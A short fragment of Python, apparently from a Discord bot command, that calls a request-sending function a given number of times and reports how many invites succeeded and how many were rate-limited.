    successful_invites, rate_limits = await execute_requests(url, amount, json_request, headers_get)
    await interaction.followup.send(f"Completed:\n\nSuccessful invites: {successful_invites}\n\nUnsuccessful invites: {rate_limits}")